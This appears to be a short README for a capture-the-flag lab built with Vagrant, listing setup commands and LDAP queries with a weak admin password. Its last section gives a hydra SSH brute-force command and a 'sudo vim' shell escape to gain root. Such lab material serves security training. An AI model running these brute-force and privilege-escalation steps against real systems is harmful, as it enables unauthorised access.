In order to deploy the environment
- Install vagrant
- Run "vagrant up"
- Run "vagrant provision" if the machine is up and you want to deploy ansible on it 
- Run "vagrant ssh" to access to the machine
- Run "vagrant rsync-auto" to rsync folders to vagran machine
- Run "vagrant destroy -f" to destroy the machine 



Ldap commands: 
- ldapsearch -x -s base -b "" -H ldap://ns-server-1 namingContexts // to check the base
- ldapsearch -x -D "cn=admin,dc=ctf,dc=local" -b "dc=ctf,dc=local" -H ldap://ns-server-1 -w admin // to check the users
- ldapwhoami -x -D "uid=carol,ou=users,dc=ctf,dc=local" -w <password> -H ldap://ns-server-1


To crack ssh_keys 
- hydra -L usernames.txt -P password.txt ssh://192.168.1.86 -t 4 -vV // usar esos ficheros o el common-dictionary
- Do an ssh with david and run --> sudo vim -c ':!/bin/sh --> access with root